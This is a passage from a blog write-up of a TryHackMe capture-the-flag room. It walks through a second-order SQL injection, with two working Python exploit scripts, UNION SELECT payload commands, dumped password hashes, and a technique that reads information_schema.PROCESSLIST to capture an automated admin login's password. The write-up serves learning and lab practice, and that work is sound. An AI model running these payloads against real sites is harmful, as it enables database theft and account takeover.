</span></span><span style=display:flex><span>        <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exit</span>(<span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>ip</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#e06c75>original_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>2</span>]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>first_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>modify_payload</span>(<span style=color:#e06c75>original_payload</span>, (<span style=color:#d19a66>1</span>, <span style=color:#d19a66>16</span>))
</span></span><span style=display:flex><span>    <span style=color:#e06c75>second_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>modify_payload</span>(<span style=color:#e06c75>original_payload</span>, (<span style=color:#d19a66>17</span>, <span style=color:#d19a66>32</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Creating user with first payload: </span><span style=color:#98c379>{</span><span style=color:#e06c75>first_payload</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>first_payload</span>):
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] User created successfully. Attempting first login...&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>first_response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>first_payload</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>first_results</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>extract_results</span>(<span style=color:#e06c75>first_response</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Creating user with second payload: </span><span style=color:#98c379>{</span><span style=color:#e06c75>second_payload</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e06c75>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>second_payload</span>):
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] User created successfully. Attempting second login...&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>second_response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>second_payload</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>second_results</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>extract_results</span>(<span style=color:#e06c75>second_response</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[+] Combined results:&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#e5c07b>len</span>(<span style=color:#e06c75>first_results</span>)):
</span></span><span style=display:flex><span>                <span style=color:#e06c75>full_result</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>first_results</span>[<span style=color:#e06c75>i</span>]
</span></span><span style=display:flex><span>                <span style=color:#c678dd>if</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>&lt;</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>second_results</span>) <span style=color:#56b6c2>and</span> <span style=color:#e06c75>second_results</span>[<span style=color:#e06c75>i</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>():
</span></span><span style=display:flex><span>                    <span style=color:#e06c75>full_result</span> <span style=color:#56b6c2>+=</span> <span style=color:#e06c75>second_results</span>[<span style=color:#e06c75>i</span>]
</span></span><span style=display:flex><span>                <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;  - </span><span style=color:#98c379>{</span><span style=color:#e06c75>full_result</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[-] Failed to create user for second query.&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[-] Failed to create user. Check the payload or connection.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#e06c75>__name__</span> <span style=color:#56b6c2>==</span> <span style=color:#98c379>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>main</span>()
</span></span></code></pre></div><p><img src=/images/THM-RabbitHole/full_hashes.png alt="full hashes"></p><pre tabindex=0><code>0e3ab8e45ac1163c2343990e427c66ff
a51e47f646375ab6bf5dd2c42d3e6181
de97e75e5b4604526a2afaed5f5439d7
</code></pre><p>We are unable to crack the <code>admin</code> hash and although we crack the two other hashes we cannot use the passwords to connect via SSH.</p><p><img src=/images/THM-RabbitHole/foobar_pwd.png alt="cracked passwords"></p><p><img src=/images/THM-RabbitHole/failed_SSH.png alt="failed SSH logins"></p><p>We also check the <code>logins</code> table but it only contains <code>username</code> and <code>login_time</code> which will not be helpful.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#34;logins&#34; AND table_schema=DATABASE(); --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/logins_table.png alt="logins table"></p><p>Let&rsquo;s see which other database(s) we have.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, schema_name FROM information_schema.schemata; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/full_db_names.png alt="full databases names"></p><p>Besides the <code>web</code> database we have the <code>information_schema</code> database.</p><h2 id=queries-extraction>Queries Extraction</h2><blockquote><p>Full credit for this part goes to <code>jaxafed</code> with his write up available <a href=https://jaxafed.github.io/posts/tryhackme-rabbit_hole/#extracting-the-current-queries>here</a>. I was not able to make the link between the automated logins and the database itself.</p></blockquote><p>At this point we have exhausted a lot of options, but there is more to explore. Remember how we had noticed that the admin user was logging in <strong>every minute</strong>, it obviously points to some sort of automation.</p><p>It turns out that we can make use of the <code>PROCESSLIST</code> command to see which queries are being made in the background and if our timing is right, the admin password will be exposed. <em>Read more about <code>PROCESSLIST</code> <a href=https://mariadb.com/kb/en/information-schema-processlist-table/>here</a>.</em></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#7f848e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sys</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>bs4</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>BeautifulSoup</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>threading</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>url_base</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>1</span>]
</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>2</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>sessions</span> <span style=color:#56b6c2>=</span> {}
</span></span><span style=display:flex><span><span style=color:#e06c75>results</span> <span style=color:#56b6c2>=</span> {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>create_and_login</span>(<span style=color:#e06c75>i</span>, <span style=color:#e06c75>sqli_payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>s</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>session</span>()
</span></span><span style=display:flex><span>    <span style=color:#e06c75>s</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url_base</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;register.php&#34;</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span>{<span style=color:#98c379>&#34;username&#34;</span>: <span style=color:#e06c75>sqli_payload</span>, <span style=color:#98c379>&#34;password&#34;</span>: <span style=color:#98c379>&#34;jxf&#34;</span>, <span style=color:#98c379>&#34;submit&#34;</span>: <span style=color:#98c379>&#34;Submit Query&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#e06c75>s</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url_base</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;login.php&#34;</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span>{<span style=color:#98c379>&#34;username&#34;</span>: <span style=color:#e06c75>sqli_payload</span>, <span style=color:#98c379>&#34;password&#34;</span>: <span style=color:#98c379>&#34;jxf&#34;</span>, <span style=color:#98c379>&#34;login&#34;</span>: <span style=color:#98c379>&#34;Submit Query&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#e06c75>sessions</span>[<span style=color:#e06c75>i</span>] <span style=color:#56b6c2>=</span> <span style=color:#e06c75>s</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>fetch_query_result</span>(<span style=color:#e06c75>i</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>r</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sessions</span>[<span style=color:#e06c75>i</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>url_base</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>soup</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>BeautifulSoup</span>(<span style=color:#e06c75>r</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>, <span style=color:#98c379>&#34;html.parser&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>tables</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>soup</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>find_all</span>(<span style=color:#98c379>&#34;table&#34;</span>, <span style=color:#e06c75>class_</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;u-full-width&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>output</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>tables</span>[<span style=color:#d19a66>1</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>find</span>(<span style=color:#98c379>&#34;td&#34;</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>get_text</span>()
</span></span><span style=display:flex><span>    <span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span>] <span style=color:#56b6c2>=</span> <span style=color:#e06c75>output</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>threads</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>15</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>sqli_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#39;&#34; UNION SELECT 1, SUBSTR((</span><span style=color:#98c379>{</span><span style=color:#e06c75>payload</span><span style=color:#98c379>}</span><span style=color:#98c379>), </span><span style=color:#98c379>{</span><span style=color:#e06c75>i</span> <span style=color:#56b6c2>*</span> <span style=color:#d19a66>16</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>1</span><span style=color:#98c379>}</span><span style=color:#98c379>, 16);#&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>threading</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>Thread</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>create_and_login</span>, <span style=color:#e06c75>args</span><span style=color:#56b6c2>=</span>(<span style=color:#e06c75>i</span>, <span style=color:#e06c75>sqli_payload</span>))
</span></span><span style=display:flex><span>    <span style=color:#e06c75>threads</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>thread</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>start</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>threads</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>while</span> <span style=color:#e5c07b>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>threads</span> <span style=color:#56b6c2>=</span> [<span style=color:#e06c75>threading</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>Thread</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>fetch_query_result</span>, <span style=color:#e06c75>args</span><span style=color:#56b6c2>=</span>(<span style=color:#e06c75>i</span>,)) <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>15</span>)]
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>threads</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>start</span>()
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>thread</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>threads</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>thread</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#7f848e># check that we are not missing any part of the result</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e5c07b>all</span>([<span style=color:#e5c07b>len</span>(<span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span>]) <span style=color:#56b6c2>&lt;=</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>1</span>]) <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>1</span>, <span style=color:#d19a66>15</span>)]):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>result</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;&#34;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>([<span style=color:#e06c75>results</span>[<span style=color:#e06c75>i</span>] <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>0</span>, <span style=color:#d19a66>15</span>)])
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>result</span>) <span style=color:#56b6c2>&gt;</span> <span style=color:#d19a66>16</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#e06c75>result</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exit</span>(<span style=color:#d19a66>0</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    <span style=color:#e06c75>time</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sleep</span>(<span style=color:#d19a66>1</span>)
</span></span></code></pre></div><p>We need to catch the query when the admin logs in which is every minute, it might require to run the script multiple times in order to get the correct query.</p><p>Using the script made by <code>jaxafed</code>, we find the query revealing the password.</p><pre tabindex=0><code>python3 admin_sqli.py &#39;http://IP_ADDRESS/&#39; &#39;SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE &#34;%INFO_BINARY%&#34; LIMIT 1&#39;
</code></pre><p><img src=/images/THM-RabbitHole/admin_pwd_retrieval.png alt="admin password retrieval"></p><p>With the password we login via SSH and read the flag.</p><p><img src=/images/THM-RabbitHole/flag.png alt="flag location"></p><p>I&rsquo;ve been enjoying the bump in quality of the TryHackMe challenges recently. If you want to learn more about SQL injections vulnerabilities, I would recommend the SQL injection learning path on PortSwigger available <a href=https://portswigger.net/web-security/learning-paths/sql-injection>here</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/thm-k2/>&#8592;
Previous:
THM: K2</a></p><p class=prev-post-date>October 24, 2024</p></div><div class=next-post><p><a href=/posts/thm-seetwo/>Next:
THM: SeeTwo
&#8594;</a></p><p class=next-post-date>November 4, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#xss-attempt>XSS Attempt</a></li><li><a href=#second-order-sql-injection>Second Order SQL injection</a></li></ul></li><li><a href=#queries-extraction>Queries Extraction</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>